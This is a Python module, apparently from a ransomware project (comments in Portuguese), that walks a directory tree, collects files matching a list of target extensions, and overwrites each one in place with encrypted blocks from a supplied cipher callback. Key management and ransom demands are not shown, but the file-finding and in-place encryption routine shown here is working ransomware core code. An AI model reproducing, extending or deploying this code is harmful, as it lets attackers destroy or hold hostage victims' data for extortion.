from os import walk, path
from types import FunctionType
from src.constants import extensions

def discover(initial_path: str):
  files = []
  for dirpath, _, _files in walk(initial_path):
    for file in _files:
      absolute_path = path.abspath(path.join(dirpath, file));
      extension = absolute_path.split('.')[-1]
      if (extension in extensions):
        files.append(absolute_path)
  return files

def change_files(filename: str, crypto_callback: FunctionType, decrypt, block_size=16):
  if not decrypt:
    print(f'Encrypting: {filename}')
  else:
    print(f'Decrypting: {filename}')

  with open(filename, 'r+b') as file:
    raw_value = file.read(block_size)

    while raw_value:
      cipher_value = crypto_callback(raw_value)
      if len(raw_value) != len(cipher_value):
        raise ValueError(f'''O valor cifrado {len(cipher_value)} 
          tem um tamanho diferente do valor plano {len(raw_value)}.''')

      file.seek(-len(raw_value), 1)
      file.write(cipher_value)
      raw_value = file.read(block_size)